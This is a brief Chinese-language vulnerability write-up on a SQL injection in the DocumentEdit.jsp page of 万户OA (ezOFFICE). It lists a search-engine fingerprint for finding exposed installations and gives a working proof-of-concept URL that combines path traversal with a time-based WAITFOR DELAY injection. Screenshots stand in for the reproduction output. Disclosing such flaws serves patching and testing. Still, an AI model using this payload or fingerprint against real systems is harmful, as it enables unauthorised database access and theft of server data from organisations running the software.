# 万户OA DocumentEdit.jsp SQL注入漏洞

## 漏洞描述

万户OA DocumentEdit.jsp文件存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息

## 漏洞影响

<a-checkbox checked>万户OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="万户网络-ezOFFICE"</a-checkbox></br>

## 漏洞复现

产品页面

![img](../../../.vuepress/public/img/1631323798806-958050db-05f6-47ca-95b4-74487ee67a66-20220905141730301.png)

验证POC

```html
/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--
```

![img](../../../.vuepress/public/img/1662358602569-71e26a34-726b-4d75-b683-225884ec7b4a.png)![img](../../../.vuepress/public/img/1662358633067-36051816-df31-4886-b3cb-69fa17dd5872.png)